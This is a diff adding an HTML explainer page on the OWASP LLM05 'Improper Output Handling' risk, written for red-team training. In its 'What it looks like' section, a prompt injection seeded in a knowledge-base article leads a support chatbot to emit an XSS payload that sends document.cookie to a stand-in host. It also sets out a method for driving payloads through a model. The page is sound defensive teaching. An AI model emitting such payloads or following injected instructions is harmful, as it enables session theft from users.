@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>LLM05 Improper Output Handling — Red Teaming Risks</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="paper.css" />
+</head>
+<body>
+<header class="bar"><div class="bar-in">
+  <div class="brand"><span class="dot"></span>RED&nbsp;TEAM&nbsp;//&nbsp;RISKS</div>
+  <a class="back" href="../index.html#surface">← back to the map</a>
+</div></header>
+<main>
+  <div class="eyebrow"><span>the attack surface</span><span class="box wb mono">LLM05:2025</span></div>
+  <h1>Improper Output Handling</h1>
+  <div class="authors">OWASP Top 10 for LLM Applications · 2025</div>
+  <div class="paperlink">
+    <span class="lbl">OWASP</span>
+    <a href="https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/" target="_blank" rel="noopener">LLM05: Improper Output Handling — OWASP GenAI ↗</a>
+  </div>
+  <p class="lead">Improper Output Handling is insufficient validation, sanitization, and handling of LLM-generated output <strong>before it is passed downstream</strong> to other components — turning the model into an unfiltered conduit for classic appsec payloads.</p>
+  <h2>How it's exploited</h2>
+  <p>The model is upstream of a sink that trusts it. Whatever text the LLM emits flows, unsanitized, straight into a browser, shell, database, or HTTP client — so a crafted (or prompt-injected) response carries an executable payload into a context that interprets it:</p>
+  <ul>
+    <li><strong>XSS</strong> — model-authored HTML/Markdown/JavaScript rendered verbatim in a browser.</li>
+    <li><strong>RCE</strong> — output handed to a system shell, <code>eval()</code>, or a code interpreter.</li>
+    <li><strong>SQL injection</strong> — generated queries executed without parameterization.</li>
+    <li><strong>SSRF / CSRF</strong> — attacker-controlled URLs or forged requests embedded in the reply.</li>
+    <li><strong>Path traversal &amp; privilege escalation</strong> — unsanitized file paths and over-broad backend permissions exercised via the output.</li>
+  </ul>
+  <h2>What it looks like</h2>
+  <p>A support chatbot renders model replies as Markdown. An attacker seeds a knowledge-base article (or sends a message) that steers the model into returning <code>&lt;img src=x onerror=fetch('//evil/'+document.cookie)&gt;</code>. The frontend renders it raw → <strong>stored XSS</strong> firing in every agent's session. Same root cause, different sinks: "delete all tables" echoed into an unparameterized query, or a hallucinated package name that ships malware into a build.</p>
+  <h2>How to test for it</h2>
+  <p>Treat the model as an injection oracle and drive standard appsec payloads <em>through</em> it. Prompt it to emit <code>&lt;script&gt;</code> / <code>onerror=</code> handlers and watch whether the UI executes them; coax SQL meta-characters or stacked queries into any DB-bound output; request URLs and file paths to probe SSRF and traversal sinks; chain with prompt injection (LLM01) so the trigger comes from data, not the user. The bug is in the <strong>sink</strong> — confirm the rendered/executed result, not just the model text.</p>
+  <h2>Defenses</h2>
+  <p>Adopt a <strong>zero-trust posture toward model output</strong>: validate and sanitize it exactly as you would untrusted user input.</p>
+  <ul>
+    <li><strong>Context-aware output encoding</strong> at every sink — HTML, JS, SQL, URL, shell.</li>
+    <li><strong>Parameterized queries / prepared statements</strong> for all DB access.</li>
+    <li><strong>Content Security Policy</strong> to blunt XSS; follow OWASP ASVS input-handling guidance.</li>
+    <li><strong>Least privilege</strong> on backends the model can reach, plus logging and anomaly detection on output-driven actions.</li>
+  </ul>
+</main>
+<footer>Part of the <a href="../index.html">Red Teaming ramp-up map</a> · OWASP LLM Top 10 (2025) · verify against the current OWASP text.</footer>
+</body>
+</html>
